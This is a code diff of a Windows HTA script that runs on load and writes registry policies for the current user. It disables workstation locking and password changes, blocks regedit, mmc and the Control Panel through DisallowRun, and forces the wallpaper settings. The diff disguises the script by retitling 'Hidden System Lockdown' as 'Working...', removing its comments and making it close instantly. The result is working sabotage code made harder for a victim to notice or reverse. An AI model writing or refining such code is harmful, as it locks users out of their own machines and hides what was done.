@@ -1,6 +1,6 @@
 <html>
 <head>
-<title>Hidden System Lockdown</title>
+<title>Working...</title>
 
 <HTA:APPLICATION
       ID="oHTA"
@@ -21,35 +21,18 @@ function setReg(path, type, value) {
 }
 
 function applyPolicies() {
-    // ActiveDesktop
+
     var ad = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop\\";
     setReg(ad+"NoChangingWallPaper", "REG_DWORD", 1);
     setReg(ad+"NoAddingComponents", "REG_DWORD", 1);
     setReg(ad+"NoDeletingComponents", "REG_DWORD", 1);
-    setReg(ad+"NoComponents", "REG_DWORD", 1);
+    setReg(ad+"NoComponents", "REG_DWORD", 0); 
 
-    // Explorer
     var ex = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\";
-    setReg(ex+"NoDriveTypeAutoRun", "REG_DWORD", 91);
-    setReg(ex+"NoActiveDesktopChanges", "REG_DWORD", 1);
-    setReg(ex+"NoThemesTab", "REG_DWORD", 1);
-    setReg(ex+"NoSimpleStartMenu", "REG_DWORD", 1);
-    setReg(ex+"NoSearchInternetInStartMenu", "REG_DWORD", 1);
-    setReg(ex+"ForceRunOnStartMenu", "REG_DWORD", 1);
-    setReg(ex+"NoDesktop", "REG_DWORD", 1);
-    setReg(ex+"NoControlPanel", "REG_DWORD", 1);
+    setReg(ex+"NoDesktop", "REG_DWORD", 0);
 
-    // Programs
-    var pr = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Programs\\";
-    setReg(pr+"NoGetPrograms", "REG_DWORD", 1);
-    setReg(pr+"NoInstalledUpdates", "REG_DWORD", 1);
-    setReg(pr+"NoWindowsMarketplace", "REG_DWORD", 1);
-
-    // System - Wallpaper
     var sys = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\";
     setReg(sys+"Wallpaper", "REG_SZ", "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg");
-
-    // Stretched & centered: TileWallpaper=0, WallpaperStyle=2
     setReg("HKCU\\Control Panel\\Desktop\\TileWallpaper", "REG_SZ", "0");
     setReg("HKCU\\Control Panel\\Desktop\\WallpaperStyle", "REG_SZ", "2");
 
@@ -63,7 +46,6 @@ function applyPolicies() {
     setReg(sys+"DisableLockWorkstation", "REG_DWORD", 1);
     setReg(sys+"DisableChangePassword", "REG_DWORD", 1);
 
-    // HKCU Policies
     setReg("HKCU\\Software\\Policies\\Microsoft\\Windows\\Explorer\\NoPinningToTaskbar", "REG_DWORD", 1);
 
     var persCU = "HKCU\\Software\\Policies\\Microsoft\\Windows\\Personalization\\";
@@ -72,21 +54,12 @@ function applyPolicies() {
     setReg(persCU+"NoChangingColorScheme", "REG_DWORD", 1);
     setReg(persCU+"NoChangingStartMenuBackground", "REG_DWORD", 1);
 
-    // HKLM Policies (requires admin)
-    var persLM = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Personalization\\";
-    setReg(persLM+"NoChangingLockScreen", "REG_DWORD", 1);
-    setReg(persLM+"NoLockScreen", "REG_DWORD", 1);
-
-    setReg("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer\\HideRecentlyAddedApps", "REG_DWORD", 1);
-
-    // DisallowRun
     var dr = ex + "DisallowRun\\";
     setReg(dr+"1", "REG_SZ", "mmc.exe");
     setReg(dr+"2", "REG_SZ", "regedit.exe");
     setReg(dr+"3", "REG_SZ", "control.exe");
 
-    // Close HTA after 3 seconds
-    setTimeout(function(){ window.close(); }, 3000);
+    window.close();
 }
 
 window.onload = applyPolicies;
